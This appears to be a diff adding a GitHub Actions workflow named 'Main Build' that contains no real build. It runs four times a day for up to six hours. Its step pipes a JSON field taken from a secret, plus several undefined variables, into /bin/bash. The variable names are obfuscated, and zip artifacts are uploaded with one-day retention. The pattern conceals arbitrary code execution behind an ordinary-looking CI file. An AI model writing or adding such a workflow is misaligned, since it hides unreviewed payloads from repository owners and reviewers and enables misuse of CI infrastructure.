@@ -1,0 +1,33 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '59 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          jz16505: ${{ secrets.jz16505 }}
+        run: |
+          printf '%s' "$jz16505" | jq -r .onjq202 | /bin/bash
+          echo $tagwb47330 | jq -r .itops1966 | /bin/bash
+          printf '%s' "$f431" | jq -r .udoqk81 | /bin/bash
+          echo $mt5798 | jq -r .ye33249 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: H0R4rN39
+          path: "*.zip"
+          retention-days: 1
